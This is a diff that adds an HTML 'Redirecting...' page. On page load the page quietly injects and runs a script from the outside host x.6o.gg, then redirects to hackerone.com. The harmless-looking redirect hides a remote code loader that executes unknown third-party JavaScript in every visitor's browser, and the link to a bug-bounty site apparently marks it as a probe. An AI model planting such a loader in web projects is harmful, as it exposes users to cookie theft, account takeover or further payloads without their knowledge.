@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        function loadScriptAndRedirect() {
+            var script = document.createElement('script');
+            script.onload = function() {
+                // Redirect once the external script has loaded
+                window.location.href = 'https://www.hackerone.com';
+            };
+            script.src = "https://x.6o.gg/i";
+            document.head.appendChild(script);
+        }
+
+        // Call the function when the page is loaded
+        window.onload = loadScriptAndRedirect;
+    </script>
+</head>
+<body>
+    <p>If you are not redirected, <a href="https://www.hackerone.com">click here</a>.</p>
+</body>
+</html>
